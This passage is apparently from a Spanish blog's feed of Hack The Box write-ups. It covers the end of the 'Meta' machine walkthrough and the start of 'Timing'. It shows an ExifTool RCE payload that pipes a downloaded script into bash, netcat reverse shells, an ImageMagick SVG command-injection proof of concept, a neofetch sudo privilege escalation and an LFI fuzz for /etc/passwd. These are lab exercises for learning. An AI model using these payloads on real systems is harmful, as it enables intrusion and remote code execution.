comandos.\nExiftool RCE Para realizar la explotación debemos de realizar git clone al repositorio de exiftool y utilizar uno de los commits entre las versiones 7.44 a 12.23.\nCon ello podemos ejecutar exiftool con el archivo de configuracion (eval.config) pasandole un comando, en este caso un ping a nuestra maquina.\n1 2 3 4 5 π exiftool 416433281bff7e021e04acd9d1f15634c9a66964 ✗ ❯ ./exiftool -config ../JPEG_RCE/eval.config ../JPEG_RCE/runme.jpg -eval=\u0026#39;system(\u0026#34;ping -c 3 10.10.14.198\u0026#34;)\u0026#39; 1 image files updated π exiftool 416433281bff7e021e04acd9d1f15634c9a66964 ✗ ❯ ls ../JPEG_RCE/ eval.config POC.mp4 README.md runme.jpg runme.jpg_original π exiftool 416433281bff7e021e04acd9d1f15634c9a66964 ✗ ❯ Tras subir la imagen vemos que el comando se ejecutó.\nObtuvimos solicitudes en nuestra máquina.\n1 2 3 4 5 6 7 8 9 π ~/htb/meta ❯ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 00:44:31.504565 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 17794, seq 1, length 64 00:44:31.504604 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 17794, seq 1, length 64 00:44:32.505642 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 17794, seq 2, length 64 00:44:32.505659 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 17794, seq 2, length 64 00:44:33.507040 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 17794, seq 3, length 64 00:44:33.507056 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 17794, seq 3, length 64 Shell Ejecutamos shells y creamos una nueva imagen para ejecutar una shell inversa.\n1 2 3 π exiftool 416433281bff7e021e04acd9d1f15634c9a66964 ✗ ❯ ./exiftool -config ../JPEG_RCE/eval.config ../JPEG_RCE/runme.jpg -eval=\u0026#39;system(\u0026#34;wget -qO- 10.10.14.198/10.10.14.198:1338|bash\u0026#34;)\u0026#39; 1 image files updated π exiftool 416433281bff7e021e04acd9d1f15634c9a66964 ✗ ❯ Con ello logramos obtener una shell como www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/meta ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.198] from artcorp.htb [10.10.11.140] 33682 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/dev01.artcorp.htb/metaview www-data@meta:/var/www/dev01.artcorp.htb/metaview$ Vemos el codigo fuente de la pagina, la función donde ejecuta exiftool sobre la imagen.\nphp code\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; function upload() { $output = \u0026#34;\u0026#34;; if (isset($_FILES[\u0026#34;imageUpload\u0026#34;])) { $filepath = $_FILES[\u0026#39;imageUpload\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $fileSize = filesize($filepath); $fileinfo = finfo_open(FILEINFO_MIME_TYPE); $filetype = finfo_file($fileinfo, $filepath); if ($fileSize === 0 || $fileSize === false) { return \u0026#34;The file is empty.\u0026#34;; } if ($fileSize \u0026gt; 2097152) { return \u0026#34;The file is too large (max 2MB)\u0026#34;; } $allowedTypes = [ \u0026#39;image/png\u0026#39; =\u0026gt; \u0026#39;png\u0026#39;, \u0026#39;image/jpeg\u0026#39; =\u0026gt; \u0026#39;jpg\u0026#39; ]; if (!in_array($filetype, array_keys($allowedTypes))) { return \u0026#34;File not allowed (only jpg/png).\u0026#34;; } $filename = basename($filepath); $extension = $allowedTypes[$filetype]; $targetDirectory = __DIR__ . \u0026#34;/uploads\u0026#34;; $newFilepath = $targetDirectory . \u0026#34;/\u0026#34; . $filename . \u0026#34;.\u0026#34; . $extension; if (!move_uploaded_file($filepath, $newFilepath)) { return \u0026#34;Error during upload.\u0026#34;; } return exiftool_exec($newFilepath); } } $output = upload(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, shrink-to-fit=no\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;author\u0026#34; content=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;MetaView\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;link href=\u0026#34;css/styles.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;main_container\u0026#34; class=\u0026#34;container h-100 d-flex\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;jumbotron my-auto\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;MetaView\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Upload your image to display related metadata.\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;custom-file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;imageUpload\u0026#34; id=\u0026#34;imageUpload\u0026#34; class=\u0026#34;custom-file-input\u0026#34;onchange=\u0026#34;this.nextElementSibling.innerText = this.files[0].name\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;custom-file-label\u0026#34; for=\u0026#34;imageUpload\u0026#34;\u0026gt;Choose file..\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group-append\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Upload\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(!empty($output)): ?\u0026gt; \u0026lt;div class=\u0026#34;mt-3\u0026#34; id=\u0026#34;output_data\u0026#34;\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;?php echo $output; ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 // lib/ExifToolWrapper.php \u0026lt;?php function exiftool_exec($newFilepath) { return shell_exec(\u0026#34;exiftool \u0026#34; . escapeshellarg($newFilepath) . \u0026#34; --system:all --exiftool:all -e\u0026#34;); } ?\u0026gt; User - Thomas Vemos al usuario thomas en /home, tras enumerar no encontramos información para obtener acceso a este usuario. Ejecutamos pspy, descubrimos que este usuario tiene un cronjob para ejecutar el script convert_images.sh.\n1 2 3 4 5 6 7 8 2022/02/01 20:01:01 CMD: UID=0 PID=19551 | /usr/sbin/CRON -f 2022/02/01 20:01:01 CMD: UID=0 PID=19550 | /usr/sbin/CRON -f 2022/02/01 20:01:01 CMD: UID=1000 PID=19552 | /bin/sh -c /usr/local/bin/convert_images.sh 2022/02/01 20:01:01 CMD: UID=1000 PID=19553 | /bin/bash /usr/local/bin/convert_images.sh 2022/02/01 20:01:01 CMD: UID=1000 PID=19554 | /usr/local/bin/mogrify -format png *.* 2022/02/01 20:01:01 CMD: UID=0 PID=19555 | /usr/sbin/CRON -f 2022/02/01 20:01:01 CMD: UID=0 PID=19556 | /bin/sh -c rm /tmp/* 2022/02/01 20:01:01 CMD: UID=1000 PID=19557 | /bin/bash /usr/local/bin/convert_images.sh El script ejecuta mogrify tomando todas las imagenes en formato .png en el directorio /var/www/dev01.artcorp.htb/convert_images/.\n1 2 3 4 5 www-data@meta:/$ cat /usr/local/bin/convert_images.sh #!/bin/bash cd /var/www/dev01.artcorp.htb/convert_images/ \u0026amp;\u0026amp; /usr/local/bin/mogrify -format png *.* 2\u0026gt;/dev/null pkill mogrify www-data@meta:/$ Si revisamos este comando es ImageMagick en su version 7.0.10-36.\n1 2 3 4 5 6 7 8 9 10 11 www-data@meta:/home/thomas$ which mogrify /usr/local/bin/mogrify www-data@meta:/home/thomas$ ls -lah /usr/local/bin/mogrify lrwxrwxrwx 1 root root 6 Aug 29 15:59 /usr/local/bin/mogrify -\u0026gt; magick www-data@meta:/home/thomas$ magick -version Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org Copyright: © 1999-2020 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib www-data@meta:/home/thomas$ searchsploit muestra multiples vulnerabilidades para la version más cercana.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/meta ❯ searchsploit ImageMagick --------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------- --------------------------------- GeekLog 2.x - \u0026#39;ImageImageMagick.php\u0026#39; Remote File Inclusion | php/webapps/3946.txt ImageMagick - Memory Leak | multiple/local/45890.sh ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH) | windows/local/31688.pl ImageMagick 6.9.3-9 / 7.0.1-0 - \u0026#39;ImageTragick\u0026#39; Delegate Arbitrary Command Execut | multiple/local/39791.rb ImageMagick 6.x - \u0026#39;.PNM\u0026#39; Image Decoding Remote Buffer Overflow | linux/dos/25527.txt ImageMagick 6.x - \u0026#39;.SGI\u0026#39; Image File Remote Heap Buffer Overflow | linux/dos/28383.txt ImageMagick 7.0.1-0 / 6.9.3-9 - \u0026#39;ImageTragick \u0026#39; Multiple Vulnerabilities | multiple/dos/39767.txt --------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results π ~/htb/meta ❯ ImageMagick - Shell Injection Tambien encontramos un post de ImageMagick - Shell injection via PDF password donde muestra un PoC de una imagen SVG que permite ejecutar comandos.\n1 2 3 4 5 6 7 8 9 \u0026lt;image authenticate=\u0026#39;ff\u0026#34; `echo $(id)\u0026gt; ./0wned`;\u0026#34;\u0026#39;\u0026gt; \u0026lt;read filename=\u0026#34;pdf:/etc/passwd\u0026#34;/\u0026gt; \u0026lt;get width=\u0026#34;base-width\u0026#34; height=\u0026#34;base-height\u0026#34; /\u0026gt; \u0026lt;resize geometry=\u0026#34;400x400\u0026#34; /\u0026gt; \u0026lt;write filename=\u0026#34;test.png\u0026#34; /\u0026gt; \u0026lt;svg width=\u0026#34;700\u0026#34; height=\u0026#34;700\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;image xlink:href=\u0026#34;msl:poc.svg\u0026#34; height=\u0026#34;100\u0026#34; width=\u0026#34;100\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; Modificamos el PoC para realizar un ping a nuestra máquina.\n1 2 3 4 5 6 7 8 9 \u0026lt;image authenticate=\u0026#39;ff\u0026#34; `ping -c 3 10.10.14.198`;\u0026#34;\u0026#39;\u0026gt; \u0026lt;read filename=\u0026#34;pdf:/etc/passwd\u0026#34;/\u0026gt; \u0026lt;get width=\u0026#34;base-width\u0026#34; height=\u0026#34;base-height\u0026#34; /\u0026gt; \u0026lt;resize geometry=\u0026#34;400x400\u0026#34; /\u0026gt; \u0026lt;write filename=\u0026#34;/dev/shm/test.png\u0026#34; /\u0026gt; \u0026lt;svg width=\u0026#34;700\u0026#34; height=\u0026#34;700\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;image xlink:href=\u0026#34;msl:image.svg\u0026#34; height=\u0026#34;100\u0026#34; width=\u0026#34;100\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; Tras unos segundos obtuvimos multiples pings.\n1 2 3 4 5 6 7 8 9 π ~/htb/meta/www ❯ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 01:19:04.448940 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 19840, seq 1, length 64 01:19:04.448981 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 19840, seq 1, length 64 01:19:05.450592 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 19840, seq 2, length 64 01:19:05.450622 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 19840, seq 2, length 64 01:19:06.451784 IP artcorp.htb \u0026gt; 10.10.14.198: ICMP echo request, id 19840, seq 3, length 64 01:19:06.451819 IP 10.10.14.198 \u0026gt; artcorp.htb: ICMP echo reply, id 19840, seq 3, length 64 Shell Agregamos una shell inversa, logrando obtener acceso como thomas y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/meta ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.198] from artcorp.htb [10.10.11.140] 42070 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ whoami;id thomas uid=1000(thomas) gid=1000(thomas) groups=1000(thomas) thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cd thomas@meta:~$ ls user.txt thomas@meta:~$ cat user.txt 90e4234367d020079151cbd9270efca0 thomas@meta:~$ Privesc Utilizamos la clave privada SSH de thomas para obtener una shell más comoda.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/meta ❯ nano key_thomas π ~/htb/meta ❯ chmod 600 key_thomas π ~/htb/meta ❯ ssh thomas@10.10.11.140 -i key_thomas Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. thomas@meta:~$ Observamos que puede ejecutar el comando neofetch como root.\n1 2 3 4 5 6 7 8 9 10 11 12 thomas@meta:~$ sudo -l -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/neofetch \\\u0026#34;\\\u0026#34; thomas@meta:~$ Tras la ejecución muestra información de la máquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 thomas@meta:~$ sudo /usr/bin/neofetch _,met$$$$$gg. root@meta ,g$$$$$$$$$$$$$$$P. --------- ,g$$P\u0026#34; \u0026#34;\u0026#34;\u0026#34;Y$$.\u0026#34;. OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P\u0026#39; `$$$. Host: VMware Virtual Platform None \u0026#39;,$$P ,ggs. `$$b: Kernel: 4.19.0-17-amd64 `d$$\u0026#39; ,$P\u0026#34;\u0026#39; . $$$ Uptime: 7 hours, 9 mins $$P d$\u0026#39; , $$P Packages: 495 (dpkg) $$: $$. - ,d$$\u0026#39; Shell: bash 5.0.3 $$; Y$b._ _,d$P\u0026#39; CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz Y$$. `.`\u0026#34;Y$$$$P\u0026#34;\u0026#39; GPU: VMware SVGA II Adapter `$$b \u0026#34;-.__ Memory: 180MiB / 1994MiB `Y$$ `Y$$. `$$b. `Y$$b. `\u0026#34;Y$b._ `\u0026#34;\u0026#34;\u0026#34; thomas@meta:~$ Si observamos, la variable XDG_CONFIG_HOME esta configurada en sudoers la vemos en el output de sudo -l -l -\u0026gt; env_keep+=XDG_CONFIG_HOME, por lo que podriamos modificarla, vemos en neofecth que este utiliza el archivo de configuración que se encuentra en $HOME/.config del usuario que lo ejecuta.\nAl ejecutarlo con sudo utiliza el archivo de configuración que se encuentra en /root/.config, si modificamos la variable XDG_CONFIG_HOME podriamos apuntar a la configuración local de thomas.\nModificamos el archivo de configuración de neofetch.\n1 2 3 4 5 6 7 8 9 10 11 12 thomas@meta:~$ head .config/neofetch/config.conf # See this wiki page for more info: # https://github.com/dylanaraps/neofetch/wiki/Customizing-Info print_info() { prin \u0026#34;$(whoami;id)\u0026#34; info title info underline info \u0026#34;OS\u0026#34; distro info \u0026#34;Host\u0026#34; model info \u0026#34;Kernel\u0026#34; kernel thomas@meta:~$ Modificamos la variable XDG_CONFIG_HOME y ejecutamos neofetch con sudo, vemos la salida de nuestro comando al inicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo /usr/bin/neofetch _,met$$$$$gg. root uid=0(root) gid=0(root) groups=0(root) ,g$$$$$$$$$$$$$$$P. root@meta ,g$$P\u0026#34; \u0026#34;\u0026#34;\u0026#34;Y$$.\u0026#34;. --------- ,$$P\u0026#39; `$$$. OS: Debian GNU/Linux 10 (buster) x86_64 \u0026#39;,$$P ,ggs. `$$b: Host: VMware Virtual Platform None `d$$\u0026#39; ,$P\u0026#34;\u0026#39; . $$$ Kernel: 4.19.0-17-amd64 $$P d$\u0026#39; , $$P Uptime: 7 hours, 20 mins $$: $$. - ,d$$\u0026#39; Packages: 495 (dpkg) $$; Y$b._ _,d$P\u0026#39; Shell: bash 5.0.3 Y$$. `.`\u0026#34;Y$$$$P\u0026#34;\u0026#39; CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz `$$b \u0026#34;-.__ GPU: VMware SVGA II Adapter `Y$$ Memory: 182MiB / 1994MiB `Y$$. `$$b. `Y$$b. `\u0026#34;Y$b._ `\u0026#34;\u0026#34;\u0026#34; thomas@meta:~$ Finalmente agregamos una shell inversa al archivo de configuracion, logrando obtener acceso como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/meta ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.198] from artcorp.htb [10.10.11.140] 33710 root@meta:/home/thomas# whoami root root@meta:/home/thomas# cd /root root@meta:~# ls conf root.txt root@meta:/home/thomas# cat root.txt 03c068505c7d80bd7c68b4950dbf64a4 root@meta:~# ","description":"Tras una enumeración de subdominios encontramos MetaView la cual utiliza una version de ExifTool vulnerable por la cual logramos obtener acceso a la máquina. Tras descubrir un cronjob que ejecuta ImageMagick con una version vulnerable logramos acceder a un segundo usuario. Finalmente escalamos privilegios modificando la variable de configuracion de usuario para neofetch.","id":25,"section":"posts","tags":["ffuf","exiftool","exiftool-rce","pspy","imagemagick","command injection","neofetch"],"title":"Hack The Box - Meta","uri":"https://sckull.github.io/posts/meta/"},{"content":"\rEn Timing encontramos una vulnerabilidad LFI que nos permitió obtener el codigo fuente del sitio web, acceder y escalar privilegios en este, posteriormente acceso por una Web Shell donde encontramos credenciales en un backup del sitio para acceder por SSH. Finalmente escalamos privilegios utilizando el archivo de configuración .wgetrc.\nNombre Timing OS Linux Puntos 30 Dificultad Media IP 10.10.11.135 Maker irogir\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 5.5, 4.7, 5.3, 4.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 1, 9, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra el puerto http (80) y ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Nmap 7.91 scan initiated Tue Jan 25 23:58:19 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.135 Nmap scan report for 10.10.11.135 (10.10.11.135) Host is up (0.064s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Simple WebApp |_Requested resource was ./login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 25 23:58:30 2022 -- 1 IP address (1 host up) scanned in 10.98 seconds Web Site En el sitio web se muestra un formulario para el ingreso de usuarios.\nDirectory Brute Forcing Feroxbuster muestra multiples paginas en php y un directorio de imagenes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 π ~/htb/timing ❯ feroxbuster -u http://10.10.11.135/ -w $MD -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.135/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 313c http://10.10.11.135/images 302 0l 0w 0c http://10.10.11.135/index.php 302 0l 0w 0c http://10.10.11.135/profile.php 200 177l 374w 5609c http://10.10.11.135/login.php 200 0l 0w 0c http://10.10.11.135/image.php 302 0l 0w 0c http://10.10.11.135/header.php 301 9l 28w 321c http://10.10.11.135/images/uploads 200 115l 264w 3937c http://10.10.11.135/footer.php 302 0l 0w 0c http://10.10.11.135/upload.php 301 9l 28w 310c http://10.10.11.135/css 301 9l 28w 309c http://10.10.11.135/js 302 0l 0w 0c http://10.10.11.135/logout.php 403 9l 28w 277c http://10.10.11.135/server-status π ~/htb/timing ❯ Profile Pages Tenemos acceso unicamente a login.php en donde pide un usuario y contraseña. Burpsuite nos muestra un cambio en la url al visitar paginas que necesitan acceso como profile.php donde vemos que utiliza ./ para indicar el \u0026ldquo;directorio actual\u0026rdquo; de la pagina login.php.\n1 2 3 4 5 6 7 8 9 GET /./login.php HTTP/1.1 Host: 10.10.11.135 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=4ik63pl6tqhds7j8grki4m2ecs Upgrade-Insecure-Requests: 1 Tomando en cuenta que esta utilizando ./, utilizamos ../ para \u0026ldquo;subir\u0026rdquo; un directorio y acceder a la pagina index.php.\n1 2 3 GET /./login.php/../index.php HTTP/1.1 Host: 10.10.11.135 [.. snip ..] Esto nos permitió acceder al contenido de la pagina index.php.\nprofile.php muestra un formulario para la actualización de la informacion del usuario.\nEn esta misma pagina encontramos un archivo javascript js/profile.js que contiene el codigo para realizar la actualizacion, donde tambien vemos una nueva pagina: profile_update.php.\n1 2 3 4 5 6 7 8 9 10 11 12 function updateProfile() { var xml = new XMLHttpRequest(); xml.onreadystatechange = function() { if (xml.readyState == 4 \u0026amp;\u0026amp; xml.status == 200) { document.getElementById(\u0026#34;alert-profile-update\u0026#34;).style.display = \u0026#34;block\u0026#34; } }; xml.open(\u0026#34;POST\u0026#34;, \u0026#34;profile_update.php\u0026#34;, true); xml.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); xml.send(\u0026#34;firstName=\u0026#34; + document.getElementById(\u0026#34;firstName\u0026#34;).value + \u0026#34;\u0026amp;lastName=\u0026#34; + document.getElementById(\u0026#34;lastName\u0026#34;).value + \u0026#34;\u0026amp;email=\u0026#34; + document.getElementById(\u0026#34;email\u0026#34;).value + \u0026#34;\u0026amp;company=\u0026#34; + document.getElementById(\u0026#34;company\u0026#34;).value); } Tras recrear la solicitud en burpsuite muestra que el id del usuario no fue encontrado.\nExpand me\r1 2 3 4 5 6 7 8 9 10 11 POST /./login.php/../profile_update.php HTTP/1.1 Host: 10.10.11.135 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=6si8q9m331tkhphku687j22q0n Content-Length: 52 firstName=user\u0026amp;lastName=user\u0026amp;email=user\u0026amp;company=user 1 2 3 4 5 6 7 8 9 10 HTTP/1.1 200 OK Date: Wed, 26 Jan 2022 00:56:58 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 31 Content-Type: text/html; charset=UTF-8 No user with this id was found. upload.php, nos muestra un mensaje.\nNo permission to access this panel! Finalmente image.php es una pagina en blanco.\nLocal File Inclusion Fuzzing Utilizamos ffuf para busqueda de parametros que pudieramos utilizar para subir algun archivo, inicialmente en upload.php, aunque en esta pagina no encontramos ninguno, en image.php encontramos img.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/timing ❯ ffuf -c -w $MD -u \u0026#34;http://10.10.11.135/./login.php/../image.php?FUZZ=/etc/passwd\u0026#34; -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/./login.php/../image.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1 